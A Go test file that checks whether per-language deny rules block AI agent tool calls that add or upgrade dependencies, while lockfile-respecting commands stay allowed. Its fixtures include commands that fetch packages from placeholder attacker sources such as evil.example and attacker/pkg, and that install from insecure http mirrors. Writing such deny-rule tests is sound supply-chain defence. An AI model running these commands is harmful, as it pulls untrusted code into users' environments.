package modules

import (
	"testing"

	"github.com/Quantum-Serendipity/qsdev/pkg/denyutil"
	"github.com/Quantum-Serendipity/qsdev/pkg/ecosystem"
)

// TestDenyRules_InstallForms runs the real command spellings that add or
// re-resolve dependencies through each module's deny rules, alongside the
// lockfile-honouring commands that must stay usable. Operations are given as
// Claude Code tool calls ("Bash(...)", "PowerShell(...)").
func TestDenyRules_InstallForms(t *testing.T) {
	t.Parallel()
	tests := []struct {
		module  string
		denied  []string
		allowed []string
	}{
		{
			module: "perl",
			denied: []string{
				"Bash(cpan Evil::Backdoor)", "Bash(cpm install Evil)",
				"Bash(perl -MCPAN -e 'install Evil')", "Bash(perl -M CPAN -e 'install Evil')",
				"Bash(perl -e 'use CPAN; CPAN::Shell->install(q(Evil))')", "Bash(carton update)",
			},
			allowed: []string{"Bash(carton install --deployment)", "Bash(prove -lr t)"},
		},
		{
			module: "elixir",
			denied: []string{
				"Bash(mix deps.update --all)", "Bash(mix deps.unlock phoenix)",
				"Bash(mix archive.install github attacker/persist)", "Bash(mix escript.install hex evil)",
				"Bash(mix igniter.install ash)",
			},
			allowed: []string{"Bash(mix deps.get --check-locked)", "Bash(mix deps.get)", "Bash(mix test)"},
		},
		{
			module: "dart",
			denied: []string{
				"Bash(dart pub add evil)", "Bash(dart pub upgrade)",
				"Bash(dart pub global activate --source git https://evil.example/x)",
				"Bash(flutter pub global activate evil)", "Bash(flutter pub upgrade --major-versions)",
				"Bash(dart pub downgrade)",
			},
			allowed: []string{"Bash(dart pub get --enforce-lockfile)", "Bash(flutter test)"},
		},
		{
			module:  "lua",
			denied:  []string{"Bash(lx add evil)", "Bash(lx install)", "Bash(luarocks build evil)", "Bash(luarocks --local install evil)"},
			allowed: []string{"Bash(lx run)", "Bash(luacheck .)"},
		},
		{
			module: "r",
			denied: []string{
				`Bash(Rscript -e "install.packages('evil')")`,
				`Bash(Rscript -e 'remotes::install_github("attacker/pkg")')`,
				`Bash(R -q -e "renv::install('evil')")`,
				`Bash(Rscript -e 'pak::pak("attacker/pkg")')`, `Bash(R -e 'update.packages(ask = FALSE)')`,
			},
			allowed: []string{`Bash(Rscript -e "renv::restore()")`, `Bash(Rscript -e "testthat::test_dir('tests')")`},
		},
		{
			module: "powershell",
			denied: []string{
				"PowerShell(Install-Module EvilModule -Force -Scope CurrentUser)",
				"PowerShell(Install-PSResource Evil)", "PowerShell(Save-Module Evil -Path .)",
				"PowerShell(Install-Script Evil)", "PowerShell(Install-Package Evil)",
				"Bash(pwsh -c Install-PSResource Evil)", "Bash(pwsh -NoProfile -Command Save-Module Evil)",
				"PowerShell(Update-Module Pester)", "Bash(pwsh -c Update-PSResource Pester)",
			},
			allowed: []string{"PowerShell(Invoke-ScriptAnalyzer -Path .)", "Bash(pwsh -Command Invoke-Pester)"},
		},
		{
			module: "nix",
			denied: []string{
				"Bash(nix profile add github:attacker/flake#tool)", "Bash(nix profile install nixpkgs#hello)",
				"Bash(nix-env -iA nixpkgs.hello)",
				"Bash(nix --extra-experimental-features 'nix-command flakes' profile add nixpkgs#hello)",
			},
			allowed: []string{"Bash(nix profile list)", "Bash(nix flake check)"},
		},
		{
			module: "ruby",
			denied: []string{
				"Bash(gem install foo --source http://mirror.internal)",
				"Bash(gem sources --add http://mirror.internal/)",
			},
			allowed: []string{"Bash(gem install foo --source https://rubygems.org)", "Bash(bundle exec rspec)"},
		},
		{
			module:  "zig",
			denied:  []string{"Bash(zig fetch --save https://evil.example/x.tar.gz)"},
			allowed: []string{"Bash(zig build test)"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.module, func(t *testing.T) {
			t.Parallel()
			mod, ok := ecosystem.DefaultRegistry().ByName(tt.module)
			if !ok {
				t.Fatalf("module %q not registered", tt.module)
			}
			drp, ok := mod.(ecosystem.DenyRuleProvider)
			if !ok {
				t.Fatalf("module %q provides no deny rules", tt.module)
			}
			rules := drp.DenyRules(ecosystem.ModuleConfig{})
			denied := func(op string) bool {
				for _, r := range rules {
					if denyutil.MatchesDenyRule(r, op) {
						return true
					}
				}
				return false
			}
			for _, op := range tt.denied {
				if !denied(op) {
					t.Errorf("%s is not denied by %v", op, rules)
				}
			}
			for _, op := range tt.allowed {
				if denied(op) {
					t.Errorf("%s is unexpectedly denied by %v", op, rules)
				}
			}
		})
	}
}
